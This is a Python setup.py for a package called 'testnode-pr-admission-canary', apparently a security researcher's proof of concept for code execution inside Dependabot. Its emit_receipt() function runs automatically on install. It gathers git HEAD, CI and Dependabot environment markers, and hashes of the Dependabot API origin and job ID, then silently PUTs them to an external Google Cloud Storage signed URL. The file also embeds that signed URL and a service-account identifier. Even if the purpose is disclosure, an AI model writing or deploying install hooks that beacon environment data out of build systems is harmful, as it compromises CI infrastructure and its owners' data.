import hashlib
import json
import os
import pathlib
import subprocess
import urllib.request
from datetime import datetime, timezone

from setuptools import setup


RECEIPT_URL = "https://treborlab-dependabot-jit-receipts-1097452703518.storage.googleapis.com/pr-admission-stage3-setup-20261103.json?x-goog-signature=2447ee790d86321e5a4667ae77794713a5b89e94dab31b948084a1c9ad00246b1ed9446ed4870e38a565c3ac3482c7b3d21538bd9e6f4b9b57b6876d472a193c997ae005a323340a0b398982f1af102d52944234cee43938b2e6ee07f8ec6319ad107609e927546abcd1baadb6c6391ab1d953c8b6250b0f5c1996fd35b4204b7c78f0fc7641f364b77bfc5c729a398e74a221ad3f9b51515ba65e643bb55792bafe39e6e04aa1cb5c111441a63c7021361bd948ec57fb905003a9f825452f6ced4252e13291df5bf63d66174f24f7c72d28e81703fc4daf8f5232e9facbc5b2723d4ff3d0c06e160fe49bfcaf4f850ed091e4f3ea9407a077a1cc23f1f086d3&x-goog-algorithm=GOOG4-RSA-SHA256&x-goog-credential=1097452703518-compute%40developer.gserviceaccount.com%2F20261103%2Fus-central1%2Fstorage%2Fgoog4_request&x-goog-date=20261103T070717Z&x-goog-expires=43200&x-goog-signedheaders=content-type%3Bhost"
CANARY = b"Reporter-owned workflow-free Dependabot PR admission canary.\n"


def sha256(value):
    return hashlib.sha256(value).hexdigest()


def git_head():
    try:
        result = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=5,
        )
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception:
        return None


def emit_receipt():
    api_url = os.environ.get("DEPENDABOT_API_URL", "").rstrip("/")
    job_id = os.environ.get("DEPENDABOT_JOB_ID", "")
    canary_path = pathlib.Path("PR_ADMISSION_STAGE1.txt")
    receipt = {
        "schema": "dependabot-pr-admission-direct-setup-v1",
        "observed_at": datetime.now(timezone.utc).isoformat(),
        "source_head": git_head(),
        "canary_matches": canary_path.is_file() and canary_path.read_bytes() == CANARY,
        "dependabot_marker": bool(os.environ.get("DEPENDABOT")),
        "dependabot_api_present": bool(api_url),
        "dependabot_job_present": bool(job_id),
        "api_origin_sha256": sha256(api_url.split("/update_jobs/")[0].encode()) if api_url else None,
        "job_id_sha256": sha256(job_id.encode()) if job_id else None,
        "github_actions": bool(os.environ.get("GITHUB_ACTIONS")),
    }
    request = urllib.request.Request(
        RECEIPT_URL,
        data=(json.dumps(receipt, sort_keys=True) + "\n").encode(),
        headers={"Content-Type": "application/json"},
        method="PUT",
    )
    try:
        urllib.request.urlopen(request, timeout=15).read(1)
    except Exception:
        pass


emit_receipt()

setup(name="testnode-pr-admission-canary", version="0.0.1")
